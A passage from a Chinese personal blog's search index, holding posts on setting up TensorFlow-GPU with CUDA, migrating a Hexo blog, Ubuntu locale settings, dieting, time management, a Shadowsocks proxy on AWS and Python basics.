      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WIN10+TF2.0</title>
      <link href="/archives/bb4fe864.html"/>
      <url>/archives/bb4fe864.html</url>
      
        <content type="html"><![CDATA[<h1 id="win10tf20cuda100cudnn75opencv412"><a class="markdownIt-Anchor" href="#win10tf20cuda100cudnn75opencv412"></a> WIN10+TF2.0+CUDA10.0+cuDNN7.5+OpenCV4.1.2</h1><blockquote><p>配置gpu版本的tensorflow完全是小白入门tensorflow的第一步；我的电脑gpu太差也就是仅仅学习下MX250</p><p>参考了一些详细的教程，但是对于安装的版本来说有些指定的不太明确，这有个建议就是不要一味的追求新，要注意查找版本之间的关系</p></blockquote><ul><li><p>开始安装，全文无图。</p><ul><li><p>预准备工作</p><ul><li>下载<a href="https://developer.nvidia.com/cuda-toolkit-archive" target="_blank" rel="noopener">CUDA10.0</a></li><li>下载<a href="https://developer.nvidia.com/rdp/cudnn-archive" target="_blank" rel="noopener">cuDNN7.5 for CUDA10.0</a>，需要注册后下载，支持微信和QQ</li><li>下载<a href="https://www.anaconda.com/distribution/" target="_blank" rel="noopener">Anaconda</a>，直接从官网下载会很慢，推荐将下载链接复制到百度云离线下载中，保存到百度云在进行下载速度快很多。或者直接下载百度云分享：链接：<a href="https://pan.baidu.com/s/1BKtXWtUVFl4isthLj4LLPg%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9Assjs" target="_blank" rel="noopener">https://pan.baidu.com/s/1BKtXWtUVFl4isthLj4LLPg提取码：ssjs</a></li><li>在cmd中cmd中使用nvidia-smi查看显卡驱动是否正确安装，不过一般没啥问题</li></ul></li><li><p>安装CUDA10.0</p><ul><li><p>双击exe文件，只需要设置下安装路径就行，记住安装路径选择之后，左右的安装路径请保持一致。</p></li><li><p>到了驱动安装选项中，不要勾选NVIDAI Experience那个选项，因为我们用不到。</p></li><li><p>最后会提示没有vs支持，这个需要安装visual studio，勾选选择需要就行，然后就是漫长的安装vs过程，安装过程中选择C++桌面安装就行，选择好安装路径，不要都堆在C盘。</p></li><li><p>直至安装完成</p></li><li><p>最后测试下cmd中输入nvcc -V，显示正确的信息则安装完成。</p></li></ul></li><li><p>安装cuDNN7.5</p><ul><li>解压下载的安装包，打开文件夹，将文件夹中的内容复制到CUDA的安装路径中，这里以D:/CUDAv10.0为例，复制到该文件夹下。</li></ul></li><li><p>添加环境变量</p><ul><li>右击此电脑-高级系统设置-环境变量-系统变量里面的path：里面可以看到CUDA_PATH和CUDA_PATH_V10已经存在，以安装CUDA的路径为D:\CUDAv10.0为例添加以下路径到到path中：<ul><li>D:\CUDAv10.1\bin</li><li>D:\CUDAv10.1\include</li><li>D:\CUDAv10.1\lib\x64</li></ul></li></ul></li><li><p>安装Anaconda3</p><ul><li>安装过程中只需要设置下安装路径即可</li><li>添加环境变量，以安装路径为D:\Anaconda3为例，添加以下变量到Path<ul><li>D:\Anaconda3</li><li>D:\Anaconda3\Scripts</li><li>D:\Anaconda3\Library\bin</li></ul></li><li>经过上面的步骤就可以在cmd中使用conda，pip，python</li></ul></li><li><p>安装tensorflow-gpu</p><ul><li>现在cmd中升级下pip配置下pip的源，第二部分的问题中有提到具体方法；</li><li>使用pip安装<ul><li>pip install tensorflow-gpu==2.0.0-rc0</li><li>等待安装完成</li></ul></li><li>测试是安装成功，cmd下输入<ul><li>&gt; python</li><li>&gt;&gt;import tensorflow as tf</li><li>&gt;&gt;tf.__versioin__</li><li>输出’2.0.0-rc0’</li></ul></li></ul></li><li><p>完成安装</p></li><li><p>在python中使用opencv</p><ul><li>第一步在电脑中下载编译opencv，在另一篇文章中写道<code>opencv安装与配置</code></li><li>以安装路径为D:\opencv4.1.2\opencv\build，找到D:\opencv4.1.2\opencv\build\python\cv2\python-3.7下的以pyd为后缀的文件，拷贝到python所在目录的Lib\site-packages文件夹下，有必要的话可以将D:\opencv4.1.2\opencv\build\python\cv2\python-3.7添加到环境变量中。</li><li>在python中测试：<ul><li>import cv2 as cv</li><li>cv._<em>version</em>_</li><li>‘4.1.2’</li></ul></li></ul></li></ul></li></ul><h1 id="tensorflow安装过程中遇到的问题与解决办法"><a class="markdownIt-Anchor" href="#tensorflow安装过程中遇到的问题与解决办法"></a> Tensorflow安装过程中遇到的问题与解决办法：</h1><ul><li>下载anaconda速度非常慢<ul><li>将anaconda下载链接复制到百度云离线下载中，保存到百度云进行下载，速度虽然慢（还至少比官网快）但是稳定，当然迅雷应该也是可以；</li></ul></li><li>pip安装tensorflow速度很慢<ul><li>更改pip的源改为清华的镜像源</li><li>pip install pip -U<br />pip config set global.index-url <a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a></li><li>更改完以后下载库文件直接从这个镜像源下载，速度很快的。</li></ul></li><li>conda更换源<ul><li>conda config --add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</a></li><li>conda config --set show_channel_urls yes</li></ul></li></ul><p>参考：</p><ul><li><a href="https://blog.csdn.net/huanyingzhizai/article/details/89298964#%E5%AE%89%E8%A3%85tensorflow1.13(with-Anaconda)" target="_blank" rel="noopener">https://blog.csdn.net/huanyingzhizai/article/details/89298964#%E5%AE%89%E8%A3%85tensorflow1.13(with-Anaconda)</a></li><li><a href="https://blog.csdn.net/huanyingzhizai/article/details/100778893" target="_blank" rel="noopener">https://blog.csdn.net/huanyingzhizai/article/details/100778893</a></li><li><a href="https://blog.csdn.net/weixin_42267309/article/details/92800901" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42267309/article/details/92800901</a></li><li><a href="https://blog.csdn.net/qq_43673118/article/details/90140395" target="_blank" rel="noopener">https://blog.csdn.net/qq_43673118/article/details/90140395</a></li><li><a href="https://blog.csdn.net/ITLearnHall/article/details/81708148" target="_blank" rel="noopener">https://blog.csdn.net/ITLearnHall/article/details/81708148</a></li><li><a href="https://blog.csdn.net/howlclat/article/details/78783701" target="_blank" rel="noopener">https://blog.csdn.net/howlclat/article/details/78783701</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>换电脑之博客迁移.md</title>
      <link href="/archives/b3404e24.html"/>
      <url>/archives/b3404e24.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>解决的问题：换电脑使得原来的博客环境失效，现在需要将在新电脑上写博客。<br />解决方法：在新电脑上重新配置hexo</p></blockquote><p>步骤：</p><ul><li><p>1、准备工作</p><ul><li>将原来博客中的文件拷贝，然后在新电脑上创建一个Blog文件夹；</li><li>下载node.js,<a href="http://nodejs.cn/download/" target="_blank" rel="noopener">官网下载</a>，之后安装，测试安装成功的方法是在cmd下，使用npm –V可以看到输出内容安装成功；</li><li>使用npm包管理工具下载hexo，命令为：npm install hexo-cli –g；<a href="https://hexo.io/" target="_blank" rel="noopener">参考官网</a></li><li>测试hexo安装成功的方式同npm：hexo –V</li><li>安装git，<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">官网</a>。然后和配置博客时一样同样需要使用生成公钥，链接GitHub；</li></ul></li><li><p>2、开始配置</p><ul><li>所有的操作都在git bash中操作；在Blog的上一层文件夹下，使用hexo init Blog/命令进行初始化，然后将上面拷贝好的文件中的一下几个文件和文件夹替换Blog文件下的文件：<br />source<br />themes<br />_config.yml</li><li>然后 切换到Blog文件夹下，使用命令安装所需要的依赖，这都要看你原本博客中的依赖是什么，因为依赖版本的更新比较快，建议自己重新安装依赖：npm install xxx1 xxx2 xxx3 --save</li><li>依赖安装完成后，基本上就可以使用了，同样可以使用hexo s –g 来检查下博客是否能够重新显示，如果没有问题可以写博客部署到服务器试一下，一定要在本地看一下能不能使用成功，否则直接推到服务器很可能使得博客网站不显示。</li></ul></li><li><p>参考：</p><p><a href="https://blog.csdn.net/littlehaes/article/details/81503455" target="_blank" rel="noopener">https://blog.csdn.net/littlehaes/article/details/81503455</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机视觉在新技术浪潮的革新和挑战</title>
      <link href="/archives/9bb65d10.html"/>
      <url>/archives/9bb65d10.html</url>
      
        <content type="html"><![CDATA[<p>计算机视觉技术：</p><p>让计算机利用抽象出来的算法来进行处理现实中的问题。</p><p>计算机视觉的发展离不开硬件和算法的进步。</p><p>使用的案例：美国的NASA火星探测器，使用的双目的摄像头。利用双目摄像头采集图像，通过分析图像来得出一些计算和探测的数据信息。</p><p>计算机视觉的系统大多是前端和后端两部分：前端使用摄像头，后端借助GPU进行算法计算（机器视觉、图像处理、卷及神经网络）。</p><p>下面介绍的是计算机视觉的发展方向：</p><ul><li>1、图像处理：<ul><li>点算子</li><li>线性滤波</li><li>几何变换、</li><li>全局优化</li><li>特征检测和匹配<ul><li>边缘特征</li><li>线条特征</li><li>特征匹配</li></ul></li><li>运动估计<ul><li>平移配准</li><li>层次运动</li><li>光流信息</li></ul></li></ul></li></ul><center>**深度学习很多灵感来源于传统方法**</center><ul><li><p>2、深度学习技术</p><ul><li>神经网络：<ul><li>输入层，隐藏层，输出层</li><li>全连接</li><li>激活函数</li><li>反向传播BP：提到的是GOOGLE最新提出的论文不需要反向传播的算法，不需要反向传播的原理是什么。</li><li>损失函数：计算真实值和算法求出数据的差距</li></ul></li><li>卷积神经网络：<ul><li>简单的神经网络很难处理图像二维的数据，他需要将二维转变为一维数据，很那捕捉像素之间的联系。</li><li>卷积神经网络：模仿人依靠卷积核来获得一定的感受野，提取纹理特征然后一层层感受分析获得信息，首先获得比较浅层的信息，比如边缘什么，越高层获得信息越高层。</li><li>卷积核：可以降低模型参数量，可以参数共享</li><li>降采样层：降低输入图像在网络中一层一层不断深入的维度，减小内存浪费</li><li>全连接：</li><li>Dropout：解决过拟合的方法之一</li></ul></li></ul></li><li><p>3、CNN应用</p><ul><li>图像识别：<ul><li>VGG</li><li>ResNet</li><li>Inception</li></ul></li><li>目标检测：<ul><li>RCNN</li><li>SSD</li><li>YOLO</li></ul></li><li>分割：<ul><li>FCN</li><li>Mask-RCNN</li><li>U-Net</li></ul></li></ul></li></ul><hr /><p>前沿探索举例：</p><ul><li><p>目标检测：</p><ul><li>Anchor-Fre    *********<ul><li>CornerNet</li></ul></li><li>关键点</li></ul></li><li><p>图像识别：</p><ul><li>粗粒度的图像识别：是猫、是狗等类间</li><li><strong>细粒度图像识别</strong>：是花猫、是长尾猫等类内。</li></ul></li><li><p>网络结构改进：</p><ul><li>合理复杂度下提升效果<ul><li>提升信息流效率(跳层连接)</li></ul></li><li>合理效果下提升效率<ul><li>降低计算损耗</li><li>降低内存占用</li></ul></li></ul></li></ul><p>行业应用举例：</p><ul><li>商品识别：<ul><li>数据采集：<ul><li>1、手持终端(SFA)采集</li><li>图像质量不一</li><li>场景变换不确定</li><li>数据可用性</li><li>模型挑战：增强适应恶劣场景</li><li>2、利用机器人特定固定（超市）</li><li>图像质量：高像素摄像头</li><li>场景变换：固定</li><li>数据可用性：高可用</li><li>模型挑战：细粒度商品识别</li></ul></li><li>数据预处理<ul><li>图像质量：<ul><li>模糊检测</li><li>倾斜检测</li><li>超分辨率重建</li><li>背景去除</li></ul></li></ul></li><li>模型训练<ul><li>使用通用检测模型</li></ul></li><li>模型测试</li><li>模型服务：实际场景应用</li></ul></li></ul><p>虽然有些因为知识的欠缺很难理解，但是还是可以多思考，在以后补充。</p><h3 id="多读论文多思考-了解新的思路和方法和当前方法的关系"><a class="markdownIt-Anchor" href="#多读论文多思考-了解新的思路和方法和当前方法的关系"></a> 多读论文，多思考、了解新的思路和方法和当前方法的关系。</h3></br><p>【参考】<a href="https://www.bilibili.com/video/av66508436" target="_blank" rel="noopener">计算机视觉在新技术浪潮的革新和挑战</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>四象限法则</title>
      <link href="/archives/a66037f0.html"/>
      <url>/archives/a66037f0.html</url>
      
        <content type="html"><![CDATA[<p>时间管理是为了更高的规划自己的时间，更高效的处理身边事务。</p><table><thead><tr><th style="text-align:center">第一象限</th><th style="text-align:center">第二象限</th><th style="text-align:center">第三象限</th><th style="text-align:center">第四象限</th></tr></thead><tbody><tr><td style="text-align:center">重要，紧急</td><td style="text-align:center">重要，不紧急</td><td style="text-align:center">不重要，紧急</td><td style="text-align:center">不重要，不紧急</td></tr></tbody></table><p>当我们知道了四象限的具体分类标准，那么下一步的问题应该就是怎么来区分生活中的各种事情呢，来里自律的人更进一步呢。<br />划分和解决攻略：</p><ul><li><p>第一象限：需要优先处理并且要花一定的时间解决，不处理或者不解决这类问题，将会带来巨大的影响；比如明天晚上就需要开组会，让你分享。今晚的ppt准备工作和分享练习就是必须要做的。</p></li><li><p>第二象限：这类事务需要进行预约时间，也就是将事情制定一定的短期或者较长期的计划，按照计划来做事情，虽然不如第一象限的事情棘手，但是拖到时间节点的话就会变成第一象限的事情，使得事情变得更加困难。比如：四六级考试或者是完成绩效考核<br />，按照计划处理事务，会使人做事更有逻辑。</p></li><li><p>第三象限：这类事，可以亲自去做，或者可以授权别人去做，本身不会产生较大的时间影响。</p></li><li><p>第四象限：不重要也不紧急，大部分是生活的琐事或者是和交往娱乐相关，于个人成长来说并不一定需要，可有可无，那就可以适当放弃。按照时间规划，在空余时间来解决或者直接不做，远离无聊的生活就行。</p></li></ul><p>除此之外还学到的一点知识是，每天可以解决三件事，每天早晨起来，就吧三件事，按照重要程度依次做完，每天调整进度，在一段时间内，可以发现解决问题的能力会很大的提升。</p><p>在B站看到了关于白岩松的采访视频，关于年轻人应该多的去读书，人生就像是一个围棋盘，以读书来获取知识来说，以书找书，每个书就像以一个围棋点，慢慢的，点就有了联系，一个个成了面，就起势了。同时也说道了去除焦虑感的方法，那就是做长跑，做坚持到最后的”傻子”，这个时代聪明人太多了，要学会关注变化世界中不变的点，去深耕自己。</p><p>【参考】<br /><a href="https://www.bilibili.com/video/av65215628/" target="_blank" rel="noopener">白岩松采访视频</a></p>]]></content>
      
      
      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu修改系统编码</title>
      <link href="/archives/2fa3a8c0.html"/>
      <url>/archives/2fa3a8c0.html</url>
      
        <content type="html"><![CDATA[<p>问题：刚开始装系统的时候是全英文的环境，可是出现一些中文乱码。所以改为中文编码方式</p><p>解决：</p><p>1、使用 <code>locale</code> 命令查看系统当前编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">LANG&#x3D;zh_CN.UTF-8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">LANGUAGE&#x3D;zh_CN:zh</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">LC_CTYPE&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">LC_NUMERIC&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">LC_TIME&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">LC_COLLATE&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">LC_MONETARY&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">LC_MESSAGES&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">LC_PAPER&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">LC_NAME&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">LC_ADDRESS&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">LC_TELEPHONE&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">LC_MEASUREMENT&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">LC_IDENTIFICATION&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">LC_ALL&#x3D;zh_CN.UTF-8</span></pre></td></tr></table></figure><p>2、修改 <code>/etc/default/locales</code> 文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">LANG&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">LANGUAGE&#x3D;&quot;zh_CN:zh&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">LC_ALL&#x3D;&quot;zh_CN.UTF-8&quot;</span></pre></td></tr></table></figure><p>3、最后重启Ubuntu系统：</p><pre><code>reboot -n</code></pre><p>重启之后系统提示是否要进行修改名称，可选择保留旧名称，方便以后在终端的使用。</p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>9月计划表</title>
      <link href="/archives/c9ac5c9b.html"/>
      <url>/archives/c9ac5c9b.html</url>
      
        <content type="html"><![CDATA[   <center> 9月份计划表</center><h3 id="1-培训班学习"><a class="markdownIt-Anchor" href="#1-培训班学习"></a> 1、培训班学习</h3><ul><li>下午到晚上下周一之前整理出来，csdn学习2天赶上，一天整理出来文档。一小时一周的进度。主要是理解代码<br />周四到周五打完所有的文档中的程序，理解相关的知识。周六整理文档，并进行理解。</li><li>上传到网站。</li></ul><h3 id="2-就业准备"><a class="markdownIt-Anchor" href="#2-就业准备"></a> 2、就业准备</h3><ul><li>每晚上用一个小时完成华为的笔试刷题。从11点开始到睡觉前</li><li>能赶上下周四的笔试。</li><li>早晨起床开始看半小时研究5g的相关技术，了解。</li><li>早晨c++基本知识</li></ul><h1 id="center撸起袖子加油干-center"><a class="markdownIt-Anchor" href="#center撸起袖子加油干-center"></a> <center>撸起袖子加油干! </center></h1>]]></content>
      
      
      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>减肥</title>
      <link href="/archives/494fcdcb.html"/>
      <url>/archives/494fcdcb.html</url>
      
        <content type="html"><![CDATA[<h2 id="减肥的方法每天创造热量缺口"><a class="markdownIt-Anchor" href="#减肥的方法每天创造热量缺口"></a> 减肥的方法：<code>每天创造热量缺口</code></h2><ul><li>热量计算方式：大卡=千焦/4</li><li>基础代谢：90kg-2100大卡</li><li>热量缺口：热量的缺口指的是每天的基础代谢+运动-摄入热量（饮食），每天保持热量缺口400-700就可以进行减肥</li><li>每天可以瘦0.15斤  标准是：7700大卡～1kg</li></ul><p>饮食结构：</p><ul><li>碳水4、蛋白质4、脂肪9：摄入比例为：0.6/0.15/0.25</li><li>碳水、蛋白质、脂肪：315g/78.75g/58.33g</li><li>按照比例进食，可以采取的方式，少食多餐，多吃低热量的食物来保持饱腹感。少食高热量食物，仅仅当做是一小部分零食来吃。</li></ul><p>运动：</p><ul><li><strong>运动的目的是满足饮食欲望</strong>，减肥是考虑能量缺口，运动多了，缺口增大，就算饮食增多，同样每天可以保持一个稳定热量缺口。</li><li><strong>无氧运动</strong>：先消耗糖原然后在消耗脂肪，同时锻炼了肌肉，增加人体的运动代谢。这会导致人体糖原缺口增大，使得饮食大部分去补充糖原，一小部分补充给脂肪。持续锻炼无氧运动，会使得脂肪含量减低，但是也会使得人体消耗糖原大，使得吃的东西增多。一旦停止运动要同时停止进食的增多。所以要注意保持良好运动习惯至关重要。</li><li><strong>有氧运动</strong>：吃东西补充自身的原理和无氧运动同理，不同点在于有氧运动不会增加个人的运动代谢，也就是不断的有氧运动，身体的脂肪和糖原的补充比例不会变化，也就是脂肪含量只会随着恒定的能量缺口进行下降，效果较无氧运动稍差一点，好在有氧运动的入门门槛低，其目的在于提高人的心肺代谢能力，提高耐力等。可以为下一步无氧运动做准备，心扉能力提高了，无氧运动的效果会更好。</li><li><strong>运动习惯养成</strong>：培养自己运动的习惯，可以采用大目标分成小目标。比如先快走然后再30分钟后在进行慢跑。慢慢养成习惯之后在转变运动方式，比如进阶为全程慢跑，间歇HIIT等。</li><li>从小目标开始。每天关注进步，阶段性关注体重。</li></ul><h1 id="最最最重要的一点是养成运动习惯防止反弹"><a class="markdownIt-Anchor" href="#最最最重要的一点是养成运动习惯防止反弹"></a> <strong>最最最重要的一点是养成运动习惯防止反弹。</strong></h1><p>ps: 血的教训，减掉20斤后反弹了30斤。</p><p>呜～～～～。</p>]]></content>
      
      
      <categories>
          
          <category> 减肥之路 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关闭vpn之后浏览器无法连接网络</title>
      <link href="/archives/a4692f1.html"/>
      <url>/archives/a4692f1.html</url>
      
        <content type="html"><![CDATA[<p>原本使用了学校的vpn和买的vpn可以访问某些外网，但是在访问国内的网络时需要经常验证，所以为了省去验证时间需要关闭vpn，但是关闭vpn之后浏览器就不能够上网。</p><p>解决的方法记录：</p><ul><li>就chrome而言：</li><li>打开设置</li><li>滑到底部打开高级</li><li>点击使用代理设置</li><li>点击LAN设置</li><li>如下图设置<br /><img src="https://i.loli.net/2019/06/01/5cf2233201e0a92894.jpg" alt="" /></li></ul><p><strong>大功告成！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>阶段学习心得</title>
      <link href="/archives/4555512d.html"/>
      <url>/archives/4555512d.html</url>
      
        <content type="html"><![CDATA[<p>1、无论什么语言：首先需要掌握好基本的使用知识，能够做到去实际只用代码工具之后，在详细的研究其内在原理，更容易掌握该语言。也就是说学习过程一般经历新手小白-熟练使用-熟练创造工具-大师级别<br />专精某种编程语言，掌握好解决问题的思路在进行扩展的学习，就招聘会的现场来看，Python语言远没有很大的需求，更多的是c/c++和Java。</p>]]></content>
      
      
      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Xshell连接远程主机</title>
      <link href="/archives/1b44cf9e.html"/>
      <url>/archives/1b44cf9e.html</url>
      
        <content type="html"><![CDATA[<p>ssh被用来远程登录，是一种安全外壳协议，可以在不安全的网络中可以和远程通信。</p><p>在Windows中Xshell 和 SecureCRT都是可以使用ssh协议来进行远程连接服务器的工具软件。在这里我使用的是Xshell6软件，首先要确保已经安装了软件，并且在本地有了服务器的公钥，前面的一篇文章已经提到了，怎么申请AWS服务器一年的使用，怎么样在本地连接服务器。这篇文章是考虑到实验室环境中为了安全防火，会在夜晚关掉电闸，所以想在服务器上跑代码，体毛需求。</p><p>打开文件–打开–会话中属性–然后做下面的修改：<br /><img src="https://i.loli.net/2019/05/18/5cdfcba92396524284.jpg" alt="" /></p><p>然后回到你的远程主机里面进行安装用lrzsz，一个可以用来上传和下载的小工具。</p><pre><code>sudo apt-get install lrzsz</code></pre><p>安装完成之后我们就可以在通过以下命令进行文件传输</p><ul><li>rz filename 将本地文件传到远程</li><li>sz filename 将远程文件下载到本地</li></ul><p>1、注意以上是在远程主机里面进行的，这样理解上面的命令就简单了，rz就是receive 也就是接收本地上传的文件，sz也就是send将文件发送到本地。同时在Xshell支持输入命令rz回车会让你跳出窗口进行选择文件。</p><p>2、注意要保存的文件必须拥有可以访问的权限，这时候就会用到chmod命令进行管理或者更换文件夹。</p><p>当然进行文件传输的方式有多种，这里仅仅介绍了一种，可以正常使用。还有方法就是在github上建立远程仓库然后在本地和服务器上进行代码的同步。</p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[科学上网]使用AWS搭梯子记录</title>
      <link href="/archives/bdb009c5.html"/>
      <url>/archives/bdb009c5.html</url>
      
        <content type="html"><![CDATA[<p>感觉现在做什么事情都是奔着免费去的。</p><p>这是一篇<code>免费</code>搭建梯子的实录：</p><p>准备：</p><ul><li>进入AWS云官网，注册一个亚马逊账号。</li><li>信用卡，需要绑定账号，否则无法使用云服务,刚开始会扣1刀，但是现在EC2可以免费使用一年。</li><li>Xshell用来远程登录实例</li><li><a href="https://github.com/shadowsocks/shadowsocks-windows/releases" target="_blank" rel="noopener">shadowsocks</a>:用作系统代理，在Windows中下载安装使用</li></ul><p>基本上是按照步骤介绍的工具准备,然后是按照下面的步骤进行</p><ol><li>注册账号，没什么可说的，简单</li><li>右上角选择区域，选择东京或者新加坡</li><li>右上角我的账户-控制台，找到左上角：服务-计算-EC2，点击进去，然后点击启动实例<br /><img src="00.bmp" alt="" /></li><li>选择AMI<br /><img src="01.bmp" alt="" /></li><li>选择实例类型<br /><img src="02.bmp" alt="" /></li><li>配置实例，下一步</li><li>添加存储<br /><img src="03.bmp" alt="" /></li><li>添加标签，下一步</li><li>配置安全组<br /><img src="04.bmp" alt="" /></li><li>下一步进行审核审核，选择生成密钥对，下载，用来在Xshell远程连接。</li></ol><p>这样就生成了一个实例：</p><p><img src="05.bmp" alt="" /></p><p>下面通过Xshell远程登录：<br />步骤如下：</p><p><img src="06.bmp" alt="" /><br /><img src="07.png" alt="" /></p><p>在实例中安装shadowsocks服务端</p><ul><li><p>安装pip</p><pre><code>  sudo apt update  sudo apt-get install python-pip</code></pre></li><li><p>利用pip安装shadowsocks</p><pre><code>  sudo pip install shadowsocks</code></pre></li><li><p>开启服务</p><pre><code>  sudo ssserver -p port -k password -m aes-256-cfb -d start #这里的port和password都是自己指定</code></pre></li></ul><p>下载shadowsocks客户端进行如下配置：<br /><img src="08.bmp" alt="" /><br /><img src="09.bmp" alt="" /></p><p>最后一步，就是进入<a href="https://www.google.com/" target="_blank" rel="noopener">Google</a></p><p>Enjoy it！</p><p><img src="10.png" alt="" /></p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科学上网 </tag>
            
            <tag> AWS </tag>
            
            <tag> 免费 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python2和Python3的区别</title>
      <link href="/archives/ac4af3ca.html"/>
      <url>/archives/ac4af3ca.html</url>
      
        <content type="html"><![CDATA[<p>2008年，Python 3.0发布标志着Python语言打破了后向兼容，开始进化。</p><ol><li>print–&gt;print()：<br />将一条语句变为一个内置函数</li><li>默认情况下字符串变为Unicode编码</li><li>增加单例类型</li><li>更新异常：增加了as关键字，使得语句更加简洁</li><li>整数更新：long整型在Python3中消失，多有的数表现为long类型；除法更新python3中’/'永远返回浮点数。</li><li>迭代无处不在：Python3中使用迭代器可以有效保护内存。如map() filter() range() zip() keys() values() items()</li><li>生成器：在python3.x中生成器的next()方法变为__next__()方法</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python中模块的使用</title>
      <link href="/archives/fe2495d8.html"/>
      <url>/archives/fe2495d8.html</url>
      
        <content type="html"><![CDATA[<h1 id="关于模块"><a class="markdownIt-Anchor" href="#关于模块"></a> 关于模块：</h1><p><a href="https://docs.python.org/3.8/py-modindex.html" target="_blank" rel="noopener">Python模块索引大全</a></p><p>随着程序的不断变大，需要将程序分为很多文件，创建成模块，一个.py文件就是一个模块。</p><p>从目录中来导入模块，相应的目录称之为包package。使用import语句创建了一个命名空间，并在该命名空间中执行与.py相关的所有语句，要在导入后访问命名空间的内容，只要使用模块的名称当做前缀，就可以访问模块中的内容。</p><p>为了避免使用的模块名字与他人的重名，可以将模块打包成一个特定的包，<strong>要求包名不能与系统模块重名，并且包内必须有__init__.py</strong>，它也是一个模块，并且模块的名字就为包的名字。</p><ol><li><p>在程序中时经常要对模块的功能进行测试时候，在模块中的话经常用到下面一句：</p><p>if <strong>name</strong> == “<strong>main</strong>”:</p><pre><code> test()</code></pre><p>当我们在命令行运行模块文件时，Python解释器把一个特殊变量__name__置为__main__，这样就可以使得test代码在模块内部使用，而在模块外部调用模块时不运行test函数。</p></li><li><p>编写模块时需要考虑隐藏内部细节，设置私有函数来隐藏细节，需要访问时可以在公开访问的函数中函数中可以调用这些私有方法而不让模块使用者看到内部操作细节。<strong>这样可以做到代码的封装和抽象。</strong></p></li><li><p>dir()可以列出模块的内容，访问__doc__()可以得到描述函数用途的字符串</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 模块 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python中的小知识</title>
      <link href="/archives/55a385d1.html"/>
      <url>/archives/55a385d1.html</url>
      
